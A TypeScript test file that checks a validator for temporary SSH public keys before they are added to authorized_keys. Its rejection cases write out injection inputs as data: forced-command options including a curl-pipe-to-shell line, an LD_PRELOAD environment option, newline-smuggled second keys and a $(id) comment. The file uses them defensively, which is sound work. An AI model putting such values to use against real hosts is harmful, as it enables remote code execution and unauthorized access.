import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { execFileSync } from "node:child_process";
import { mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { TemporaryKeyCreateInput, TEMPORARY_KEY_MAX_LENGTH, parseTemporaryPublicKey } from "@inv/shared";
import { InvalidPublicKeyError, sshKeyFingerprint, validateTemporaryPublicKey } from "../services/access-grant-key.js";

/**
 * A temporary key is appended to authorized_keys by root. Anything but a bare
 * `<type> <base64> [comment]` line — options, a second line, a mangled blob —
 * must be refused before it gets anywhere near a host.
 */

// Throwaway key generated for this test (the private half was discarded).
const FIXTURE = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIaRzUDCUCz5Uanal7pq91W1zKAxtET/tL5dSBAEtoMm fixture@example.com";
const FIXTURE_FP = "SHA256:JaKrzpMNpT7kVtyxeO2AGh6iqco7T4Rd6Xxg4hRq+A0";
const FIXTURE_BODY = FIXTURE.split(" ")[1]!;

function rejects(raw: string, pattern?: RegExp) {
  expect(() => validateTemporaryPublicKey(raw)).toThrow(InvalidPublicKeyError);
  if (pattern) expect(() => validateTemporaryPublicKey(raw)).toThrow(pattern);
}

describe("validateTemporaryPublicKey", () => {
  it("accepts a bare ed25519 key and computes the OpenSSH fingerprint (known vector)", () => {
    const k = validateTemporaryPublicKey(FIXTURE);
    expect(k.type).toBe("ssh-ed25519");
    expect(k.comment).toBe("fixture@example.com");
    expect(k.line).toBe(FIXTURE);
    expect(k.fingerprint).toBe(FIXTURE_FP);
    expect(sshKeyFingerprint(Buffer.from(FIXTURE_BODY, "base64"))).toBe(FIXTURE_FP);
  });

  it("accepts a key without a comment and trims the trailing newline of a paste", () => {
    const k = validateTemporaryPublicKey(`ssh-ed25519 ${FIXTURE_BODY}\n`);
    expect(k.comment).toBeNull();
    expect(k.line).toBe(`ssh-ed25519 ${FIXTURE_BODY}`);
  });

  it("refuses authorized_keys options in front of the key", () => {
    rejects(`command="/bin/sh -c 'id'" ${FIXTURE}`, /options/i);
    rejects(`command="curl http://example.com/x|sh" ${FIXTURE}`);
    rejects(`from="192.0.2.1" ${FIXTURE}`, /options/i);
    rejects(`no-pty ${FIXTURE}`, /options/i);
    rejects(`restrict,port-forwarding ${FIXTURE}`, /options/i);
    rejects(`environment="LD_PRELOAD=/tmp/x.so" ${FIXTURE}`, /options/i);
  });

  it("refuses more than one line", () => {
    rejects(`${FIXTURE}\n${FIXTURE}`, /single line/);
    rejects(`${FIXTURE}\ncommand="id" ${FIXTURE}`, /single line/);
    rejects(`ssh-ed25519 ${FIXTURE_BODY}\rcommand="id"`, /single line/);
    rejects(`${FIXTURE}\0`, /single line/);
  });

  it("refuses oversized input", () => {
    rejects(`ssh-rsa ${"A".repeat(TEMPORARY_KEY_MAX_LENGTH)}`, /too long/);
    expect(TemporaryKeyCreateInput.shape.publicKey.safeParse("x".repeat(TEMPORARY_KEY_MAX_LENGTH + 1)).success).toBe(false);
  });

  it("refuses unknown types, bad base64 and a blob of the wrong type", () => {
    rejects(`ssh-dss ${FIXTURE_BODY}`, /Unsupported key type/);
    rejects(`ssh-ed25519 not*base64*at*all==`);
    rejects(`ssh-ed25519 ${FIXTURE_BODY.slice(0, -4)}`); // truncated blob
    rejects(`ssh-rsa ${FIXTURE_BODY}`, /not a ssh-rsa key/);
    rejects(`ssh-ed25519 ${Buffer.from("hello world, not a key at all!!").toString("base64")}`);
  });

  it("refuses comments with shell or sshd metacharacters, or the RackMap marker", () => {
    rejects(`ssh-ed25519 ${FIXTURE_BODY} it's-me`, /comment/);
    rejects(`ssh-ed25519 ${FIXTURE_BODY} $(id)`, /comment/);
    rejects(`ssh-ed25519 ${FIXTURE_BODY} a"b`, /comment/);
    rejects(`ssh-ed25519 ${FIXTURE_BODY} rackmap-grant:7`, /rackmap-grant/);
    rejects(`ssh-ed25519\t${FIXTURE_BODY}`, /single spaces/);
  });

  it("the shared parser agrees on the structural rules (used by the web form)", () => {
    expect(parseTemporaryPublicKey(FIXTURE).ok).toBe(true);
    expect(parseTemporaryPublicKey(`command="id" ${FIXTURE}`).ok).toBe(false);
    expect(parseTemporaryPublicKey(`${FIXTURE}\n${FIXTURE}`).ok).toBe(false);
  });
});

const hasKeygen = (() => {
  try {
    execFileSync("sh", ["-c", "command -v ssh-keygen"], { stdio: "ignore" });
    return true;
  } catch {
    return false;
  }
})();

describe.skipIf(!hasKeygen)("fingerprints match ssh-keygen -lf for freshly generated keys", () => {
  let dir = "";
  beforeAll(() => {
    dir = mkdtempSync(join(tmpdir(), "rackmap-keytest-"));
  });
  afterAll(() => {
    if (dir) rmSync(dir, { recursive: true, force: true });
  });

  function generate(name: string, args: string[]): string {
    const file = join(dir, name);
    execFileSync("ssh-keygen", ["-q", ...args, "-N", "", "-C", `${name}@example.com`, "-f", file], { stdio: "ignore" });
    rmSync(file, { force: true }); // only the public half is needed
    return file;
  }

  const cases: [string, string[]][] = [
    ["ed25519", ["-t", "ed25519"]],
    ["ecdsa256", ["-t", "ecdsa", "-b", "256"]],
    ["ecdsa384", ["-t", "ecdsa", "-b", "384"]],
    ["ecdsa521", ["-t", "ecdsa", "-b", "521"]],
    ["rsa3072", ["-t", "rsa", "-b", "3072"]],
  ];

  it.each(cases)("%s", (name, args) => {
    const file = generate(name, args);
    const pub = readFileSync(`${file}.pub`, "utf8");
    const expected = execFileSync("ssh-keygen", ["-lf", `${file}.pub`], { encoding: "utf8" }).split(" ")[1];
    const k = validateTemporaryPublicKey(pub);
    expect(k.fingerprint).toBe(expected);
    expect(k.comment).toBe(`${name}@example.com`);
  });

  it("refuses an RSA key below 2048 bits", () => {
    let file: string;
    try {
      file = generate("rsa1024", ["-t", "rsa", "-b", "1024"]);
    } catch {
      return; // this ssh-keygen refuses to make one at all
    }
    expect(() => validateTemporaryPublicKey(readFileSync(`${file}.pub`, "utf8"))).toThrow(/at least 2048 bits/);
  });
});
